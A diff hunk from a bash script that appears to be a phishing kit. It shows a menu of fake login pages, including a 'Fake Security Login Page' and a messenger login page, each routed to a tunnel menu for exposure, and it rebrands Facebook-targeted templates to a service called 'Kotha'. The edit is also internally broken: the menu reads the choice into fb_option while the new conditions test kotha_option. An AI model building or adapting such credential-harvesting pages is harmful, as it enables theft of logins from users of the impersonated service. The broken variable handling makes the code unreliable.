@@ -77,22 +77,22 @@ printf " \n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Kotha Messenger Login Page\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
 
 
-if [[ $fb_option == 1 || $fb_option == 01 ]]; then
-website="facebook"
+if [[ $kotha_option == 1 || $kotha_option == 01 ]]; then
+website="kotha"
 tunnel_menu
-elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
-website="fb_advanced"
+elif [[ $kotha_option == 2 || $kotha_option == 02 ]]; then
+website="kotha_advanced"
 tunnel_menu
-elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
-website="fb_security"
+elif [[ $kotha_option == 3 || $kotha_option == 03 ]]; then
+website="kotha_security"
 tunnel_menu
-elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
-website="fb_messenger"
+elif [[ $kotha_option == 4 || $kotha_option == 04 ]]; then
+website="kotha_messenger"
 tunnel_menu
 
 else
